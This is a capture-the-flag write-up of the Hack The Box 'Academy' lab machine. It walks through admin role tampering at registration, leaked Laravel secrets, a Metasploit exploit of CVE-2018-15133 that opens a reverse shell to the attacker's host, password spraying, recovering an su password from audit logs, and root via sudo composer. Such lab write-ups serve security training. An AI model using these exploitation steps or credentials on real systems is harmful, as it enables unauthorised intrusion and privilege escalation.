# Academy
This box is a Linux made by egre55 & mrb3n and its IP is 10.10.10.215.
Let's dive in.

We start by a complete nmap scan:
```
$ nmap -sC -sV -oA nmap/complete -p- 10.10.10.215
```
Nmap shows:
     22/tcp ssh openSSH with Ubuntu banner
          80/tcp http Apache httpd 2.4.41
	       33060/tcp mysqlx ? Nmap doesn't know that service, probably something weird

HTTP says "did not follow redirect to http://academy.htb/" so lets add that to
our hosts file and check that website.

Website is a clone of HTB Academy, a website to teach how to hack.
There's a register account, login form on the main page, then we get logged in
as "eggre55" no matter the username chosen.
Let's gobuster that website using our PHPSESSID cookie.
Gobuster shows us there's a "/admin.php" endpoint, that gets us a new login form

While checking around, i found that the "/register" endpoint takes this payload:
```
uid=shadstest&password=shadstest123&confirm=shadstest123&roleid=0
```

That role-id was a nice find. I've intercepted the request using burp suite then
set it to 1 before forwarding it. I've then logged on the app with that account,
then logged on the /admin.php endpoint, and accessed this admin page:

```
Academy Launch Planner
Item 	Status
Complete initial set of modules (cry0l1t3 / mrb3n)	done
Finalize website design 	done
Test all modules 		done
Prepare launch campaign 	done
Separate student and admin roles	done
Fix issue with dev-staging-01.academy.htb	pending
```

This gives us a new hostname to add to our hostsfile and check;

Using Firefox to acess this page, we get a 500 error and the debugging
application of what looks like to be Laravel debugging ?

The error is:
```
 UnexpectedValueException
 The stream or file "/var/www/html/htb-academy-dev-01/storage/logs/laravel.log" could not be opened in append mode: failed to open stream: Permission denied
 ```
 The debbuging app leaks the environment of the application running behind it.
 Cool stuff shown includes:

```
APP_KEY => "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
APP_DEBUG => "true"
DB_CONNECTION => "mysql"
DB_HOST => "127.0.0.1"
DB_PORT => "3306"
DB_DATABASE => "homestead"
DB_USERNAME => "homestead"

DB_PASSWORD =>"secret"
```
Decoding the AppKey does not yield text though, only bad bytes ?

---
Further research lead me to CVE CVE-2018-15133 which allows us RCE
if we have the app's secret key, which we have.
This CVE also has a metasploit module, which is nice cause i like metasploit.

```
msf6 > use exploit/unix/http/laravel_token_unserialize_exec
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215
RHOSTS => 10.10.10.215
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb
VHOST => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0
LHOST => 10.10.14.56
msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.56:4444
[*] Command shell session 1 opened (10.10.14.56:4444 -> 10.10.10.215:55796) at 2020-12-04 13:11:20 +0100

whoami
www-data
/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls
ls
css  favicon.ico  index.php  js  robots.txt  web.config
```

We got in as www-data user.
Digging into both webapps for loot;
found that one:
```
# academy/database/factories/UserFactory.php
..
  return [
          'name' => $faker->name,
          'email' => $faker->unique()->safeEmail,
          'password' => '$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm', // secret
          'remember_token' => str_random(10),
```

bcrypt hash ; found the same in htb-academy-dev-01/database/factories

In academy/.env found this:

```
DB_PASSWORD=mySup3rP4s5w0rd!!
```

What do users do with passwords ? They re-use them !
I've sprayed that password on the users found in /etc/passwd and landed a shell
on user cry0l1t3

```
$ whoami
cry0l1t3
$ cat /home/cry0l1t3/user.txt | wc -c
33
```

We've owned user. Moving on to privesc...

For ease of work i'll add an ssh key to user cry0l1t3 and use that instead
of my metasploit shell;

I've uploaded linpeas.sh, ran it, exfiled the results, then checked them;

---

Because i was in group adm i digged for a long time in /var/log.
Like, a long time.
Out of boredom, i went back to my linpeas.out hoping to find something new
and guess what, i found this:

```
[+] Checking for TTY (sudo/su) passwords in audit logs
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```
Tried that:

```
cry0l1t3@academy:/var/log$ su mrb3n
Password: mrb3n_Ac@d3my!
$ whoami
mrb3n
```
So there's that.

Once logged in as mrb3n, we check sudo privileges:

```
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n:
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
    ```

We are able to run composer as root. So we'll create a new directory, create
a "composer.json" file and add it a script that will exfil the root.txt,
then execute it using composer.

```
mrb3n@academy:/tmp/.hid$ cat composer.json
{
 "scripts": {
    "pwn": "cat /root/root.txt | wc -c"
     }
     }
     mrb3n@academy:/tmp/.hid$ sudo composer run-script pwn
     33
     ```

We've owned the root account.
